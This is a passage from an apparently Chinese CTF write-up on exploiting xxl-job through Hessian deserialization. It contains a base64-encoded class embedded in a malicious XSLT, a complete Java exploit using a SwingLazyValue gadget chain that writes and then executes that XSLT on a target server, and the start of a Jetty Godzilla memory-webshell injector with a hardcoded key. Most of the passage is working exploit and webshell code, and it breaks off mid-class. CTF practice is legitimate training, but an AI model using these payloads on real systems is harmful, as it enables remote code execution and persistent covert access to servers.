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&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;org.junit.m.EncryptionUtils&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡ŒdefineClassçš„ç±»åè®°å¾—å†™æˆæ³¨å…¥å™¨çš„ç±»åï¼Œä¸€å¼€å§‹å¿˜æ”¹äº†å¡è¿™é‡Œå¥½ä¹…æœäº†ğŸ˜­</p></blockquote><p>æœ€åå†™ä¸€ä¸ªä¸€æŠŠæ¢­çš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postExp</span><span class="hljs-params">(String url1,<span class="hljs-type">byte</span>[] poc)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadXslt</span><span class="hljs-params">(String url, String xsltFilePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAttack</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//è§£æxsltæ–‡ä»¶ç”Ÿæ•ˆ</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;http://127.0.0.1:8080/api&quot;</span>;<br>        uploadXslt(url, <span class="hljs-string">&quot;payload.xslt&quot;</span>);<br>        doAttack(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128173705623.png" alt="image-20241128173705623"></p><p>ç„¶åå†°èä¸Šçº¿</p><p><img src="https://cdn.clown2024.cn/image-20241128173725650.png" alt="image-20241128173725650"></p><p><img src="https://cdn.clown2024.cn/image-20241128173740656.png" alt="image-20241128173740656"></p><h2 id="executoræœªæˆæƒ"><a href="#executoræœªæˆæƒ" class="headerlink" title="executoræœªæˆæƒ"></a>executoræœªæˆæƒ</h2><p>å±å®æ˜¯å¹²æ— è¯­äº†ç»™æˆ‘ï¼Œæ‰“äº†åŠå¤©å‘ç°é¢˜ç›®æ˜¯æ‰“çš„executoræœªæˆæƒï¼Œé¢˜ç›®å¥½åƒæ˜¯åªç»™äº†ä¸€ä¸ªexecutorçš„ç«¯å£ï¼Œæˆ‘æœ¬åœ°æ­çš„æ‰€ä»¥adminå’Œexecutorç«¯å£éƒ½æœ‰ï¼Œç„¶åapiæœªæˆæƒä¹Ÿæ˜¯èƒ½æ­£å¸¸æ‰“ï¼Œç›´æ¥æ‰“åäº†</p><p>executoræˆ‘ä»¬è®¿é—®9999ç«¯å£ä»–çš„å›æ˜¾æ˜¯è¿™æ ·çš„</p><p><img src="https://cdn.clown2024.cn/image-20241128162332049.png" alt="image-20241128162332049"></p><p>è¿™é‡Œä¹Ÿæ˜¯ç”¨çš„hessianååºåˆ—åŒ–è¯»å–æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å»xxl-jobçš„executorçš„æºç çœ‹åˆ°jettyæœåŠ¡çš„å¯åŠ¨æºç </p><p><img src="https://cdn.clown2024.cn/image-20241128163747857.png" alt="image-20241128163747857"></p><p>è¿™é‡Œåªè®¾ç½®äº†ä¸€ä¸ªJettyServerHandlerï¼Œæ‰€æœ‰è¯·æ±‚éƒ½ä¼šç”±è¿™ä¸ªJettyServerHandleræ¥å¤„ç†ï¼Œçœ‹ä¸€ä¸‹æºç </p><p><img src="https://cdn.clown2024.cn/image-20241128163951810.png" alt="image-20241128163951810"></p><p>å¯ä»¥çœ‹åˆ°ä»–è¿™é‡Œä¹Ÿæ˜¯è¿›è¡ŒHessianååºåˆ—åŒ–å¤„ç†ï¼Œå’Œæˆ‘ä»¬å‰é¢adminçœ‹åˆ°çš„å¤„ç†æ–¹å¼æ˜¯ä¸€æ ·çš„</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦å»æ³¨å…¥ä¸€ä¸ªhandlerï¼Œä¹Ÿå°±æ˜¯jettyçš„å†…å­˜é©¬ï¼Œç›´æ¥æŠ„wpçš„äº†ï¼Œä¸€å¼€å§‹ç”¨å†…å­˜é©¬ç”Ÿæˆå™¨ç”Ÿæˆäº†æ‰“ä¸è¿›å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xxl.job.core;<br><br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.*;<br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.handler.AbstractHandler;<br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.handler.HandlerCollection;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.ref.Reference;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">//author:Boogipop</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JettyGodzillaMemshell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandler</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;3c6e0b8a9c15224a&quot;</span>; <span class="hljs-comment">// key</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;username&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">md5</span> <span class="hljs-operator">=</span> md5(pass + xc);<br>    Class payload;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">md5</span><span class="hljs-params">(String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            java.security.MessageDigest m;<br>            m = java.security.MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>            m.update(s.getBytes(), <span class="hljs-number">0</span>, s.length());<br>            ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.math.BigInteger(<span class="hljs-number">1</span>, m.digest()).toString(<span class="hljs-number">16</span>).toUpperCase();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyGodzillaMemshell</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyGodzillaMemshell</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span> &#123;<br>        System.out.println(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">HttpConnection</span> <span class="hljs-variable">valueField</span> <span class="hljs-operator">=</span> getValueField();<br>            <span class="hljs-type">HandlerCollection</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (HandlerCollection) valueField.getHttpChannel().getServer().getHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">mutableWhenRunning</span> <span class="hljs-operator">=</span> handler.getClass().getDeclaredField(<span class="hljs-string">&quot;_mutableWhenRunning&quot;</span>);<br>            mutableWhenRunning.setAccessible(<span class="hljs-literal">true</span>);<br>            mutableWhenRunning.set(handler,<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//            handler.addHandler(new JettyHandlerMemshell(1));</span><br>            Handler[] handlers = 